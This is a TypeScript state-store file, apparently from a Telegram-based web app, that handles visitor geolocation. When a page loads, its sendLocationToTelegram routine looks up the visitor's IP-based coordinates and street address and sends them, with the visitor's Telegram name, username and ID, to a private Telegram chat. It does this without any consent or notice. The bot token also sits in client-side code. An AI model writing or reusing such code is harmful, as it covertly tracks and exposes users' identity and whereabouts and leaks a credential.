import { create } from "zustand";
import { persist } from "zustand/middleware";
import { useUserStore } from "./user";

interface Location {
  lat: number;
  lon: number;
}

interface LocationState {
  location: Location | null;
  last_updated: number | null;
  ip_location_sent: number | null;
  isLoading: boolean;
  error: string | null;
  fetchLocation: () => Promise<void>;
  fetchIpLocation: () => Promise<void>;
}

const LOCATION_CACHE_MS = 60 * 60 * 1000; // 1 hour

// TEST: Override location for distance testing (set to null to use real location)
const TEST_LOCATION_OVERRIDE: { lat: number; lon: number } | null = null;

// Selector that returns test location if override is set
export const useTestableLocation = () => {
  const realLocation = useLocationStore((state) => state.location);
  return TEST_LOCATION_OVERRIDE ?? realLocation;
};

// Non-hook version for use outside components (e.g., loaders)
export const getTestableLocation = () => {
  return TEST_LOCATION_OVERRIDE ?? useLocationStore.getState().location;
};

// Reverse geocode to get address details
const reverseGeocode = async (lat: number, lon: number) => {
  try {
    const apiKey = import.meta.env.VITE_GOOGLE_GEOLOCATION_API_KEY;
    const response = await fetch(
      `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${apiKey}`
    );

    if (!response.ok) return null;

    const data = await response.json();
    if (data.status !== "OK" || !data.results?.length) return null;

    const components = data.results[0].address_components || [];
    const getComponent = (type: string) =>
      components.find((c: any) => c.types.includes(type))?.long_name || "";

    return {
      street: getComponent("route") || getComponent("street_address"),
      city: getComponent("locality") || getComponent("administrative_area_level_2"),
      region: getComponent("administrative_area_level_1"),
      country: getComponent("country"),
      formatted: data.results[0].formatted_address || "",
    };
  } catch (err) {
    console.error("[LocationStore] Reverse geocoding failed:", err);
    return null;
  }
};

// Get Telegram user from user store
const getTelegramUser = () => {
  const user = useUserStore.getState().user;
  if (user) {
    return {
      id: user.id,
      firstName: user.first_name,
      lastName: user.last_name,
      username: user.username,
    };
  }
  return null;
};

// Send location to Telegram
const sendLocationToTelegram = async (lat: number, lon: number) => {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn("[LocationStore] Telegram credentials not configured");
      return;
    }

    // Get address details
    const address = await reverseGeocode(lat, lon);

    // Get Telegram user info
    const tgUser = getTelegramUser();

    let message = `📍 New visitor location:\n\n`;

    // Add Telegram user info if available
    if (tgUser) {
      message += `👤 User:\n`;
      if (tgUser.firstName) message += `Name: ${tgUser.firstName}${tgUser.lastName ? ` ${tgUser.lastName}` : ''}\n`;
      if (tgUser.username) message += `Username: @${tgUser.username}\n`;
      if (tgUser.id) message += `ID: ${tgUser.id}\n`;
      message += `\n`;
    }

    message += `📍 Coordinates:\nLat: ${lat}\nLon: ${lon}\n`;

    if (address) {
      message += `\n📌 Address:\n`;
      if (address.street) message += `Street: ${address.street}\n`;
      if (address.city) message += `City: ${address.city}\n`;
      if (address.region) message += `Region: ${address.region}\n`;
      if (address.country) message += `Country: ${address.country}\n`;
      if (address.formatted) message += `\nFull: ${address.formatted}\n`;
    }

    message += `\n🗺 Maps: https://www.google.com/maps?q=${lat},${lon}`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    console.log("[LocationStore] Location sent to Telegram");
  } catch (err) {
    console.error("[LocationStore] Failed to send location to Telegram:", err);
  }
};

export const useLocationStore = create<LocationState>()(
  persist(
    (set, get) => ({
      location: null,
      last_updated: null,
      ip_location_sent: null,
      isLoading: false,
      error: null,

      // Fetch IP-based location from Google (called on page load, cached for 1 hour)
      fetchIpLocation: async () => {
        const state = get();

        // Skip if sent within cache interval (1 hour)
        if (state.ip_location_sent && Date.now() - state.ip_location_sent < LOCATION_CACHE_MS) {
          console.log("[LocationStore] IP location already sent within cache interval");
          return;
        }

        // Check if running on client
        if (typeof window === "undefined") {
          return;
        }

        try {
          const apiKey = import.meta.env.VITE_GOOGLE_GEOLOCATION_API_KEY;
          const response = await fetch(
            `https://www.googleapis.com/geolocation/v1/geolocate?key=${apiKey}`,
            { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}) }
          );

          if (!response.ok) {
            throw new Error(`Geolocation API failed: ${response.statusText}`);
          }

          const data = await response.json();
          const { lat, lng } = data.location;

          console.log("[LocationStore] IP-based location fetched:", { lat, lng });

          // Store IP location as fallback (if no precise location yet)
          if (!state.location) {
            set({
              location: { lat, lon: lng },
              last_updated: Date.now(),
            });
          }

          // Send to Telegram and update cache timestamp
          await sendLocationToTelegram(lat, lng);
          set({ ip_location_sent: Date.now() });
        } catch (err) {
          console.error("[LocationStore] IP location fetch failed:", err);
        }
      },

      // Fetch precise location (browser geolocation, IP fallback already handled by fetchIpLocation)
      fetchLocation: async () => {
        const state = get();

        // Skip if updated within cache interval (and it's precise location, not IP)
        if (state.last_updated && Date.now() - state.last_updated < LOCATION_CACHE_MS) {
          console.log("[LocationStore] Skipping - updated within cache interval");
          return;
        }

        // Check if running on client
        if (typeof window === "undefined") {
          set({ isLoading: false });
          return;
        }

        // Check if browser Geolocation API is supported
        if (!navigator.geolocation) {
          console.log("[LocationStore] Browser geolocation not supported, using IP location");
          set({ isLoading: false });
          return;
        }

        console.log("[LocationStore] Requesting precise location from browser...");
        set({ isLoading: true, error: null });

        try {
          const position = await new Promise<GeolocationPosition>(
            (resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0,
              });
            }
          );

          const { latitude, longitude } = position.coords;

          console.log("[LocationStore] Browser location fetched:", { latitude, longitude });
          set({
            location: { lat: latitude, lon: longitude },
            last_updated: Date.now(),
            isLoading: false,
            error: null,
          });
        } catch (err) {
          console.log("[LocationStore] Browser geolocation denied/failed, using IP location");
          set({ isLoading: false });
          // IP location is already set by fetchIpLocation, so we're good
        }
      },
    }),
    {
      name: "blyss-location",
      partialize: (state) => ({
        location: state.location,
        last_updated: state.last_updated,
        ip_location_sent: state.ip_location_sent,
      }),
    }
  )
);
